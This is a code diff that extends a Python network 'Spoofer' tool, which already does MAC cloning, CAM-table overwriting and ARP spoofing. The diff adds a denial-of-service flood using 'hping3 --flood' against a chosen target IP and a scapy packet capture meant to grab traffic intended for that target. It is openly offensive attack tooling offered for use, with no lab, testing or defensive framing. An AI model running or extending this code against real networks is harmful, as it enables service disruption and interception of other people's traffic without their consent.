@@ -2,6 +2,7 @@ import subprocess
 import re
 import random
 import argparse
+from scapy.all import sniff, wrpcap
 
 
 class Spoofer:
@@ -82,9 +83,22 @@ class Spoofer:
         subprocess.run(['sudo', 'arpspoof', '-i', interface, '-t', target_ip, gateway_ip])
         print(f"Sent spoofed ARP replies to {target_ip}.")
 
+    @staticmethod
+    def dos_attack(target_ip, interface):
+        print(f"Starting DoS attack on {target_ip} from interface {interface}...")
+        subprocess.run(['sudo', 'hping3', '--flood', '-I', interface, target_ip])
+        print(f"DoS attack on {target_ip} started.")
+
+    @staticmethod
+    def capture_packets(interface, output_file):
+        print(f"Capturing packets on interface {interface}...")
+        packets = sniff(iface=interface, count=100)  # Adjust the count as needed
+        wrpcap(output_file, packets)
+        print(f"Captured packets saved to {output_file}")
+
 
 def main():
-    parser = argparse.ArgumentParser(description='MAC Address Spoofer')
+    parser = argparse.ArgumentParser(description='Spoofer Tool')
     parser.add_argument('-i', '--interface', help='Network interface to spoof (default: all)')
     parser.add_argument('-m', '--manufacturer', choices=Spoofer.manufacturers.keys(),
                         help='Manufacturer for MAC address prefix (default: random)')
@@ -92,8 +106,11 @@ def main():
     parser.add_argument('--scan', action='store_true', help='Scan subnet for available MAC addresses')
     parser.add_argument('--overwrite-cam', action='store_true', help='Overwrite CAM of local router')
     parser.add_argument('--arp-spoof', action='store_true', help='ARP spoof devices to believe you are the gateway')
+    parser.add_argument('--dos', action='store_true', help='Perform DoS attack on target')
+    parser.add_argument('--capture', action='store_true', help='Capture packets intended for the target')
     parser.add_argument('--router-ip', help='IP address of the router for CAM overwriting')
-    parser.add_argument('--target-ip', help='IP address of the target device for ARP spoofing')
+    parser.add_argument('--target-ip', help='IP address of the target device for ARP spoofing or DoS attack')
+    parser.add_argument('--output-file', help='File to save captured packets')
 
     args = parser.parse_args()
 
@@ -118,6 +135,10 @@ def main():
                 target_mac = input("Enter the target MAC address to clone: ")
                 if args.router_ip:
                     spoofer.overwrite_cam(interface, target_mac, args.router_ip)
+                    if args.dos:
+                        spoofer.dos_attack(args.target_ip, interface)
+                    if args.capture:
+                        spoofer.capture_packets(interface, args.output_file)
                 else:
                     print("Router IP address is required for CAM overwriting.")
             elif args.arp_spoof:
